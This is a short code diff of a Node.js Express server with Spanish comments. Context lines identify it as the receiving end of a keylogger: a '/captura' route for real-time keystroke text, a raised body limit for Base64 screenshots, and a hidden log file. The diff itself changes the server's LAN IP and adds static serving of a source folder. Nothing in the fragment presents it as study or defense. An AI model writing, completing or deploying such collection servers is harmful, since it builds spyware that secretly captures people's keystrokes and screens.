@@ -7,7 +7,7 @@ const path = require('path');
 const app = express();
 const PORT = 3000;
 
-const SERVER_IP = '192.168.50.52'
+const SERVER_IP = '192.168.1.109'
 
 // CONFIGURACIÓN DE ALMACENAMIENTO
 const LOG_FILE = path.join(__dirname, '.logs_db.txt');
@@ -24,6 +24,7 @@ app.use(cors());
 // Aumentamos el límite a 10mb para soportar las capturas de pantalla en Base64
 app.use(bodyParser.json({ limit: '10mb' }));
 app.use(express.static('public'));
+app.use('/src', express.static('src'));  // Servir archivos desde la carpeta src/
 
 // 1. RUTA PARA EL KEYLOGGER (Texto en tiempo real)
 app.post('/captura', (req, res) => {
